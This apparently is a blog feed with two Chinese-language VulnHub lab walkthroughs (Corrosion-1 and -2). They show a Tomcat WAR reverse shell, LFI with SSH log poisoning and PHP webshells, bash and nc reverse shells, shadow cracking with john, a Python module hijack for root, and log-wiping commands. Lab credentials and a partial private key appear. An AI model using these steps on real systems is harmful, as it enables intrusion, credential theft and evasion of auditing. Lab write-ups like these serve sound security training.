class="code"><pre><code class="hljs shell">”manager&quot; password=&quot;melehifokivai&quot; <br><br>&quot;admin&quot; password=&quot;melehifokivai&quot; <br></code></pre></td></tr></table></figure><br/><br/><br/><br/><h2 id="外围打点："><a href="#外围打点：" class="headerlink" title="外围打点："></a>外围打点：</h2><p><strong>随便拿一条登进去吧，就拿admin，读着是管理员感觉更nb一点</strong></p><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/2.jpg" class="image.jpg"><ul><li>找到上传的文件漏洞点，不过文件的格式必须是<code>war</code>，而这个格式是<code>java</code>中的打包</li></ul><br/><br/><br/><br/><p><strong>这里有两个方法：</strong></p><ul><li><p>直接从msf搜漏洞打</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">search tomcat upload<br></code></pre></td></tr></table></figure></li><li><p>还是利用msf的模块生成木马反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -f war -o shell.war<br></code></pre></td></tr></table></figure></li></ul><br/><br/><br/><br/><h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><p>拿到shell之后，常规收集信息，都没找到有用的东西</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">history<br><br>sudo -l<br><br>crontab -l<br><br>cat /etc/crontab<br><br>find / -perm /4000 -user root -printf 2&gt;/dev/null <br><br>echo $PATH<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>然后不知道要干啥，就想着碰碰运气，看看另外两个用户密码一样不，结果jaye登录进去了，但是randy不行</strong></p><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/3.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li><strong>suid的权限位有这个在jaye里面，我们去看看</strong></li></ul><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/4.jpg" class="image.jpg"><br/><br/><p>是个可执行程序啊，不知道是干啥，去网上搜搜什么作用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">look 命令是一个用于在 Unix 和类 Unix 系统中查找单词的工具。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">它的主要功能是根据给定的前缀从字典文件中查找匹配的单词。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">命令可以拿来查看文件，而且拥有SUID</span><br><br>用法：<br><span class="hljs-meta prompt_">#</span><span class="language-bash">定义</span><br>IFILE=文件名（加上路径） 例如：IFILE=/etc/shadow<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看</span><br>./look &#x27;&#x27; &quot;$IFILE&quot;<br></code></pre></td></tr></table></figure><br/><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/5.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>直接越权读取文件了，那我们就把shadow和passwd结合就可以爆破密码，万一把root密码爆破出来，那就简单了</li></ul><br/><br/><br/><br/><p><strong>把&#x2F;etc&#x2F;shadow和&#x2F;etc&#x2F;passwd复制到kali本地</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">文件名随便取，我这里就用shadow和passwd替代</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后使用unshadow将两个文件合并</span><br>unshadow passwd shadow &gt; hash.txt （注意这里passwd一定要在shadow的前面）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">爆破</span><br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br></code></pre></td></tr></table></figure><ul><li>爆出来两个用户：<code>jaye\melehifokivai </code>、<code>randy\07051986randy</code></li></ul><br/><br/><br/><br/><h2 id="越权登陆："><a href="#越权登陆：" class="headerlink" title="越权登陆："></a>越权登陆：</h2><br/><p><strong>那就直接ssh登录到randy吧</strong></p><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/6.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h2><ul><li>找到了个python脚本</li></ul><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/7.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>不可改写是吧，那我们读来看看是什么</li></ul><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/8.jpg" class="image.jpg"><br/><br/><br/><br/><p>导入了base64模块，不给我改脚本，那我就动你模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">一般来说都在这个目录下：<span class="hljs-regexp">/usr/</span>lib/python3.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;import os;os.system(&quot;/bin/bash&quot;)&#x27; &gt;&gt; base64.py<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p>写入后，直接拿sudo运行，提权成功</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.8 /</span>home<span class="hljs-regexp">/randy/</span>randombase64.py<br></code></pre></td></tr></table></figure><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/9.jpg" class="image.jpg"><br/><br/><br/><br/><p>至此靶机通关</p><br/><br/><br/><br/><p><strong>清除痕迹</strong></p><ul><li><p>清空日志</p><p>一般是使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -i &quot;/192.168.11.138/d&quot; auth.log<br></code></pre></td></tr></table></figure></li><li><p>清空历史命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">history -c<br></code></pre></td></tr></table></figure></li></ul><hr>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>励志学习第一天之vulnhub-Corrosion-1</title>
    <link href="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/"/>
    <url>/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Corrosion-1"><a href="#Corrosion-1" class="headerlink" title="Corrosion-1"></a>Corrosion-1</h1><p><strong>靶机IP：192.168.11.137</strong></p><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a><strong>信息收集：</strong></h2><ul><li>扫端口：namp -A -p- -sV 192.168.11.137（或者使用fscan去扫描，这里偷懒一下，具体建议都扫详细点）</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/1.jpg" class="image.jpg"><p><strong>开放了22，80端口分别运行ssh，http服务</strong></p><br/><br/><br/><br/><p><strong>爆破ssh</strong>：</p><ul><li><p>依旧看到ssh，还是得爆破一波，万一出来了呢，这边由于能偷看到主机名为randy，直接拿randy去爆破</p></li><li><p>hydra -l randy -P &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;wordlist.txt ssh:&#x2F;&#x2F;192.168.11.137</p><p>（小字典就行了吧，能出的弱密码都行，大字典太消耗时间了，时间就是金钱，最后还是没有结果）</p></li></ul><br/><br/><br/><br/><p><strong>访问80端口，从web页面入手：</strong></p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/2.jpg" class="image.jpg"><ul><li>居然啥都没有搭建，就只开了个apache的默认界面，那这个肯定没啥用了</li></ul><br/><br/><br/><br/><p><strong>扫目录：</strong></p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/3.jpg" class="image.jpg"><ul><li>依次去看是啥东西</li></ul><br/><br/><br/><br/><ul><li>在tasks目录下发现任务清单：（有日志和修改端口还有搭建phpMyAdmin）</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/17.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>&#x2F;blog-post&#x2F;uploads&#x2F;目录下是一个博客</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/4.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>&#x2F;blog-post&#x2F;archives&#x2F;randylogs.php</li><li>（目录下发现个randylogs.php，但是是个空白页？？？，估计里面有东西，先放着）</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/5.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>回去看了看&#x2F;blog-post&#x2F;uploads&#x2F;，总以为能在其中找到上传的地方，结果找半天居然是个重定向的东西，</strong></p><p><strong>重定向到了&#x2F;blog-post&#x2F;，两个同个页面，那只好从其它地方入手了</strong></p><br/><br/><br/><br/><ul><li>回到刚刚的空白页，一般遇到空白页我们还是需要去FUZZ一波的，因为是个php那估计有传参搞一波</li></ul><p><strong>直接使用brup去跑就行了，当然也可以使用别的工具，例如wfuzz、yakit等都行</strong></p><ul><li>wfuzz -w （字典） -u “<a href="http://192.168.11.137/blog-post/archives/randylogs.php?FUZZ=/etc/passwd">http://192.168.11.137/blog-post/archives/randylogs.php?FUZZ=/etc/passwd</a>“   –hw 0</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/6.jpg" class="image.jpg"><br/><br/><br/><br/><p>通过文件包含漏洞来读取文件和包含文件。使用php伪协议来读取randylogs.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><span class="hljs-meta prompt_">$</span><span class="language-bash">file = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];</span><br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">file))</span><br>&#123;<br>    include(&quot;$file&quot;);<br>&#125;<br>else<br>&#123;<br>    include(&quot;index.php&quot;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">解密没有发现其他的信息，</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">只是使用include方法包含GET提交的file参数的文件。尝试读取randy的公钥、私钥，apache的日志文件都没有成功。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">读取公钥：file=php://filter/read=convert.base64-encode/resource=/home/randy/.ssh/id_rsa.pub</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">apache日志文件：file=php://filter/read=convert.base64-encode/resource=/var/log/apache2/access.log</span><br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>那这就不用想了就这个参数 file 构成LFI 漏洞</strong></p><ul><li>但是现在不知道有什么文件可以用啊</li><li>想起前面的任务清单没有，日志，那估计有存在的日志可以使用，我们去跑一下</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/7.jpg" class="image.jpg"><p><strong>扫出来挺多的，翻到这个好像是个日志我们去看看是什么日志</strong></p><br/><br/><br/><br/><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/8.jpg" class="image.jpg"><p><strong>咋一看好像是我们刚刚ssh爆破的命令都在里面了，随便搜一下是什么日志文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/var/log/auth.log<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这是一个文本文件，记录了所有和用户认证相关的日志，无论是ssh登录，还是<span class="hljs-built_in">sudo</span>执行命令都会在里面记录</span><br></code></pre></td></tr></table></figure><ul><li>那么就存在【写入日志】漏洞了</li></ul><br/><br/><br/><br/><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p><strong>SSH登录，写入WebShell</strong></p><ul><li><p>下面四条命令经尝试，都失败了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh &#x27;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php @eval($_REQUEST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php system($_REQUEST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php system($_REQUEST[&#x27;x&#x27;]); ?&gt;&#x27;@192.168.11.137<br></code></pre></td></tr></table></figure><br/><br/></li><li><p>（因为ssh的命名有限制）那就使用别名的方法去绕过这个吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在root目录下的.ssh文件里面创建文本文档config</span><br>touch config<br><span class="hljs-meta prompt_"># </span><span class="language-bash">确保文件权限正确</span><br>chmod 600 ~/.ssh/config<br><span class="hljs-meta prompt_">#</span><span class="language-bash">写入别名使用</span><br>Host myserver          # 自定义别名<br>    HostName 192.168.1.100  # 服务器IP或域名<br>    User admin              # 登录用户名<br>    Port 2222               # SSH端口（默认22可省略）<br>    IdentityFile ~/.ssh/id_rsa  # 密钥路径（可选）<br></code></pre></td></tr></table></figure><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/9.jpg" class="image.jpg"></li></ul><p><strong>端口22默认没写，并且没有密钥</strong></p><br/><br/><br/><br/><p><strong>直接ssh：</strong></p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/10.jpg" class="image.jpg"><ul><li>包含日志看看是否存在</li></ul><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/11.jpg" class="image.jpg"><ul><li>成功写入，直接开启监听反弹shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1<br>nc -e /bin/bash 192.168.11.128 9999<br><span class="hljs-meta prompt_">#</span><span class="language-bash">他奶奶的都反弹不成功，出题人干鸡毛（不是人）</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">反弹成功</span><br>bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1&#x27; （bash -c 会把字符串当作命令执行）<br>在这里不能直接这样传，因为在url上可能会有问题例如会把&amp;当做连接符，所以我们编码后传<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">另一条语句：</span><br>echo &quot;bash -i &gt;&amp; /dev/tcp/172.18.171.250/4444 0&gt;&amp;1&quot; | bash（同样可以反弹）<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/12.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>常规信息收集</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">history<br><br>sudo -l<br><br>crontab -l<br><br>cat /etc/crontab<br><br>find / -perm /4000 -user root -printf 2&gt;/dev/null <br><br>echo $PATH<br></code></pre></td></tr></table></figure><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/13.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>最终在&#x2F;var&#x2F;backups找到用户名的备份文件，那肯定得解压出来看看啊</strong></p><p><strong>你奶奶的居然要密码，那就传到kali去爆破解压</strong></p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/14.jpg" class="image.jpg"><br/><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">生成 hash.txt</span><br>zip2john user_backup.zip &gt; hash.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后使用 john 进行破解，同时指定一个强一点的字典(kali自带)</span><br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>解压之后，里面内容：</strong></p><ul><li>c文件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123; setuid(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置 userid 为0 即为最高权限(root)</span><br>  setgid(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置 groupid 为0 即为最高权限(root)</span><br>  system(<span class="hljs-string">&quot;/usr/bin/date&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>  system(<span class="hljs-string">&quot;cat /etc/hosts&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>  system(<span class="hljs-string">&quot;/usr/bin/uname -a&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><em>id_rsa</em> （私钥）</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA4INQLmsx2RU1XC<span class="hljs-operator">+</span>Wl491khfGhOtGgDxJtEpioKQY1K8gY7gYEcYw<br>Sv9lksbGQK2d9kepGRug0PisW0hZtmTXRwdgvO1uRcJzDt58iHE0iyur2EB0h50ZnD1KhD<br>DRMoXMopVtXI96ZdT0EYGNSROVP<span class="hljs-operator">+</span>RRdykBFZUQnNWCDKG4YV7b7odu3cDfPhZ9PyqFm6<span class="hljs-symbol">/2</span><br>lCQdORepNU5dkh<span class="hljs-symbol">/VIh2UwB0d5KSYzIH+NDQ8ILoWOzb5XiWyLq5BqKPIun2/gk3ZLu3Ywx</span><br>YLEnG6u8LbRCYdib8TDf<span class="hljs-operator">+</span>C66wtq4hbSKbb7HG4pKO<span class="hljs-operator">+</span>S6sfPvFjKKR2D4VbqKKgSFYqDv4P<br>K8ID58gHrGkV<span class="hljs-symbol">/PfX4lD/nag0j2S1o0llMR0/gmS8ciZqvWHT1jVGHVexrG0p25t/EwnLIb</span><br>UNrFJYPU9QPq0E6IUx6S75E6c9ctwUWTg<span class="hljs-symbol">/ZJqjXbsOiH43N0jr26pL+lb3VkJL3R9GapLT</span><br>fOFoZBXhcumY0Gij9OyJ5Lj16seewqaQEWXJfRxlAAAFgABg47MAYOOzAAAAB3NzaC1yc2<br>EAAAGBAOCDUC5rMdkVNVwvlpePdZIXxoTrRoA8SbRKYqCkGNSvIGO4GBHGMEr<span class="hljs-symbol">/ZZLGxkCt</span><br>nfZHqRkboND4rFtIWbZk10cHYLztbkXCcw7efIhxNIsrq9hAdIedGZw9SoQw0TKFzKKVbV<br>yPemXU9BGBjUkTlT<span class="hljs-symbol">/kUXcpARWVEJzVggyhuGFe2+6Hbt3A3z4WfT8qhZuv9pQkHTkXqTVO</span><br>XZIf1SIdlMAdHeSkmMyB<span class="hljs-symbol">/jQ0PCC6Fjs2+V4lsi6uQaijyLp9v4JN2S7t2MMWCxJxurvC20</span><br>QmHYm<span class="hljs-symbol">/Ew3/guusLauIW0im2+xxuKSjvkurHz7xYyikdg+FW6iioEhWKg7+DyvCA+fIB6xp</span><br>Ffz31<span class="hljs-operator">+</span>JQ<span class="hljs-symbol">/52oNI9ktaNJZTEdP4JkvHImar1h09Y1Rh1XsaxtKdubfxMJyyG1DaxSWD1PUD</span><br><span class="hljs-number">6</span>tBOiFMeku<span class="hljs-operator">+</span>ROnPXLcFFk4P2Sao127Doh<span class="hljs-operator">+</span>NzdI69uqS<span class="hljs-symbol">/pW91ZCS90fRmqS03zhaGQV4XLp</span><br>mNBoo<span class="hljs-symbol">/TsieS49erHnsKmkBFlyX0cZQAAAAMBAAEAAAGBAJY4BkwouR+wyxU1WiNqf5YShm</span><br>elLHTc4cvaAYfOhDa6Poe6Q5CQ9PsZS5MboMbh49FHPWNpUv6<span class="hljs-symbol">/hENHc49QhaIm05lVm/Td</span><br>GDMYtmZsqGV<span class="hljs-operator">+</span>AOsepVmfyeT6NYOhTjfpwnP<span class="hljs-operator">+</span>W0AVWCYOiIe2ERyWF8S6Na<span class="hljs-symbol">/vJaSVKpplWT</span><br>CufDnaSHme8JU7WaOnVIIRJ3h2Ehwo1cy<span class="hljs-symbol">/gh4CoyUEW40KEd9BHCFB6GLdj4LKeHjFSd6w</span><br><span class="hljs-number">98</span>UAn<span class="hljs-operator">+</span>oP<span class="hljs-operator">+</span>iql<span class="hljs-operator">+</span><span class="hljs-number">8</span>acIKlFAA0t4<span class="hljs-operator">+</span>k9h5spiZ0lvgpynjHz7q0nUXfGttH6U1oOrs6dJ8rCh2<br><span class="hljs-number">9</span>lQvbXvJRXfXYOvaysI4VZBwkH0qOV0LjDrYvSMLzgkZ1W8GhWhYd<span class="hljs-operator">+</span>bM7Pt4VYx7J<span class="hljs-symbol">/M2xz</span><br>j4OKTmD7O8aa<span class="hljs-symbol">/33xhlBpJw9nHqVrXxnB4b7GLDEXFW9X8V+263j1fSHKlvga44U4Ux400R</span><br>o2Ubf7Xt9AHB08B0WcLFXGpf5srUB5lsL9BPqDMChjBJSckbeXOrSKzm9RA6r6KQBR<span class="hljs-operator">+</span>QAA<br>AMB3xUZMZYy8z8FoRBY0Tp<span class="hljs-operator">+</span>IDu0AVPZE3zg8AWksguA0cGHz0<span class="hljs-operator">+</span><span class="hljs-symbol">/mN+vkJpSm2Cm5JI3ToJ</span><br>sc178uN5w4W2YDsEoPniVRoXV<span class="hljs-symbol">/4PJSVaC6ZN9Pk5WwwxvHuDBkuf3Y3J3wOUSMXhIb8QYo</span><br>hM5bSQOzdKDwTr9Mrz3eF2wu4olU50Ag4MYaYk2bkOux7HB02uikgjRjo<span class="hljs-operator">+</span>CNyTw5ra8elG<br>bT5UfCNfiFWTApC5mz0z57gfq7uNwdmA9OOG3iRA7MDk<span class="hljs-operator">+</span><span class="hljs-number">61</span>CQAAADBAPacSdrgYiwbpKFU<br>XyrNHIcP6lQrzbRspQpQckz5ncPfhy7EVluB9hFwpjoNXg0kah8nKOd09QHHfGs7WRAVRi<br>VO6aXZ3s<span class="hljs-symbol">/wA3OhH8BsFXLdfTm8bB4kujD7cWSO0yuP4rLbEfWmkVdnUEAucmRPfopaXQY3</span><br><span class="hljs-symbol">/0InQjtZghzUpm5n2uih1i6NK9XVorljeifmJEWyHzGQk/stkUuBSxa382JNLnS81SomHW</span><br>JX<span class="hljs-operator">+</span><span class="hljs-number">5</span>wBHL6NY<span class="hljs-symbol">/fBvPiodsLaOnMJTm/1OwAAAMEA6Q+jz/8akC7NnRR6WLLfJXGEVK0mSAyT</span><br>TzXBAG3BIlkPMP463lm<span 